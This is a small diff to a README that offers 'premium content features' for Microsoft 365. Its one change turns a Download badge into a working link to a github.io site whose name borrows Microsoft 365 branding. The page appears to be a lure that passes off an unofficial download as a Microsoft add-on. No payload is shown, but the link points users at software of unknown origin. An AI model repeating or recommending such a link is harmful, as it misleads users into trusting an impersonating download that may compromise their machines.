@@ -2,7 +2,7 @@
 
 Enable premium content features in Microsoft 365 applications. Add exclusive templates, graphics, and productivity tools with one simple setup.
 
-[![Download](https://img.shields.io/badge/Download-M365_Premium_Content-blueviolet)](insert-premium-content-microsoft-365.github.io.)
+[![Download](https://img.shields.io/badge/Download-M365_Premium_Content-blueviolet)](https://insert-premium-content-microsoft-365.github.io/.github)
 
 ---
 
